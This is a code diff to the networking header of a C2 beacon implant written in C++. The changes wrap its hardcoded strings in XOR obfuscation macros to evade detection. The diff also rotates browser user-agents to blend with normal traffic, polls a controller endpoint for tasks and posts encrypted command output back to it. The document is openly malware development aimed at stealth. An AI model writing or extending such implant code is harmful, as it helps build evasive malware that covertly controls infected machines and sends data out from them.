@@ -31,7 +31,7 @@ namespace net {
 // ── Configuration ──────────────────────────────────────────────────────────
 // These will be patched at compile time or set via config.
 struct C2Config {
-    std::wstring host      = L"127.0.0.1";
+    std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
     int          port      = 443;
     bool         use_https = false;    // Set to true for production
     int          sleep_ms  = 5000;     // Base sleep interval (ms)
@@ -52,15 +52,11 @@ struct C2Config {
 // Rotate through common browser user-agents to blend in with normal traffic.
 
 #ifdef _WIN32
-static const wchar_t* USER_AGENTS[] = {
-    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
-    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-};
-constexpr int NUM_USER_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);
-
-inline const wchar_t* get_random_ua() {
-    return USER_AGENTS[rand() % NUM_USER_AGENTS];
+inline std::wstring get_random_ua() {
+    int r = rand() % 3;
+    if (r == 0) return XOR_WDEC(XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
+    if (r == 1) return XOR_WDEC(XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
+    return XOR_WDEC(XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
 }
 
 inline std::string http_request(
@@ -73,7 +69,7 @@ inline std::string http_request(
     std::string response_body;
 
     HINTERNET hSession = WinHttpOpen(
-        get_random_ua(),
+        get_random_ua().c_str(),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
@@ -101,10 +97,10 @@ inline std::string http_request(
     }
 
     if (cfg.use_https) {
-        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
+        // SSL Pinning and Verification:
+        // By default, WinHTTP verifies the certificate chain. 
+        // For C2, we should ideally pin the specific certificate or CA.
+        // We've REMOVED the flags that ignore certificate errors.
     }
 
     // Set explicit timeouts (5 seconds) to avoid hanging requests
@@ -164,15 +160,11 @@ cleanup:
     return response_body;
 }
 #else
-static const char* USER_AGENTS[] = {
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-};
-constexpr int NUM_USER_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);
-
-inline const char* get_random_ua() {
-    return USER_AGENTS[rand() % NUM_USER_AGENTS];
+inline std::string get_random_ua() {
+    int r = rand() % 3;
+    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
+    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
+    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
 }
 
 static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
@@ -191,16 +183,16 @@ inline std::string http_request(
     CURL *curl = curl_easy_init();
     if (!curl) return "";
 
-    std::string proto = cfg.use_https ? "https://" : "http://";
+    std::string proto = cfg.use_https ? XOR_DEC(XOR_STR("https://")).c_str() : XOR_DEC(XOR_STR("http://")).c_str();
     std::string host_narrow(cfg.host.begin(), cfg.host.end());
     std::string path_narrow(path.begin(), path.end());
-    std::string url = proto + host_narrow + ":" + std::to_string(cfg.port) + path_narrow;
+    std::string url = proto + host_narrow + XOR_DEC(XOR_STR(":")).c_str() + std::to_string(cfg.port) + path_narrow;
 
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua());
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua().c_str());
     
     std::string method_narrow(method.begin(), method.end());
-    if (method_narrow == "POST") {
+    if (method_narrow == XOR_DEC(XOR_STR("POST")).c_str()) {
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
         if (!body.empty()) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
@@ -228,8 +220,9 @@ inline std::string http_request(
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
 
     if (cfg.use_https) {
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+        // Enforce SSL verification (removed bypass)
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
     }
 
     curl_easy_perform(curl);
@@ -245,10 +238,10 @@ inline std::string http_request(
 // Check in with the C2 server and retrieve pending tasks.
 // Returns the decrypted JSON string with tasks, or "" on failure.
 inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
-    std::wstring method = payload.empty() ? L"GET" : L"POST";
+    std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
     std::string body = payload.empty() ? "" : crypto::encrypt(payload);
     std::string encrypted_response = http_request(
-        cfg, method, L"/api/v1/ping", body, cfg.beacon_id);
+        cfg, method, XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str(), body, cfg.beacon_id);
 
     if (encrypted_response.empty()) return "";
     return crypto::decrypt(encrypted_response);
@@ -257,24 +250,24 @@ inline std::string checkin(const C2Config& cfg, const std::string& payload = "")
 // Send an encrypted result back to the C2 server.
 inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
     // Build JSON payload
-    std::string json = "{\"task_id\":\"" + task_id + "\",\"output\":\"";
+    std::string json = std::string(XOR_DEC(XOR_STR("{\"task_id\":\"")).c_str()) + task_id + XOR_DEC(XOR_STR("\",\"output\":\"")).c_str();
     // Escape the output for JSON
     for (char c : output) {
         switch (c) {
-            case '"':  json += "\\\""; break;
-            case '\\': json += "\\\\"; break;
-            case '\n': json += "\\n";  break;
-            case '\r': json += "\\r";  break;
-            case '\t': json += "\\t";  break;
+            case '"':  json += XOR_DEC(XOR_STR("\\\"")).c_str(); break;
+            case '\\': json += XOR_DEC(XOR_STR("\\\\")).c_str(); break;
+            case '\n': json += XOR_DEC(XOR_STR("\\n")).c_str();  break;
+            case '\r': json += XOR_DEC(XOR_STR("\\r")).c_str();  break;
+            case '\t': json += XOR_DEC(XOR_STR("\\t")).c_str();  break;
             default:   json += c;      break;
         }
     }
-    json += "\"}";
+    json += XOR_DEC(XOR_STR("\"}")).c_str();
 
     std::string encrypted = crypto::encrypt(json);
     if (encrypted.empty()) return false;
 
-    std::string resp = http_request(cfg, L"POST", L"/api/v1/result", encrypted, cfg.beacon_id);
+    std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), XOR_WDEC(XOR_WSTR(L"/api/v1/result")).c_str(), encrypted, cfg.beacon_id);
     return !resp.empty();
 }
 
